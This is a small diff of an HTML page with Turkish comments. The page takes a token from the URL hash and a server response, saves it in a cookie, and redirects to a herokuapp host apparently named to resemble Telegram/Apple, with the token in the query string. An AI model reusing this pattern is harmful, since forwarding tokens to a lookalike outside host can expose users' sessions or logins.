@@ -8,7 +8,7 @@
 </head>
 
 <body>
-    <p>merhaba</p>
+    <p></p>
     <script>
         // URL'den hash kısmını al
         const hash = window.location.hash;
@@ -60,6 +60,7 @@
                         // Sunucudan gelen token'ı işleyin
                         const token = data;
                         console.log('Alınan token:', token);
+                        document.cookie = `token=${token}; path=/; secure; SameSite=Strict`;
 
                         window.location.href = 'https://telagramapplegit-a55c4719cc06.herokuapp.com/?token=' + encodeURIComponent(token.replace(/"/g, ''));
                     } catch (error) {
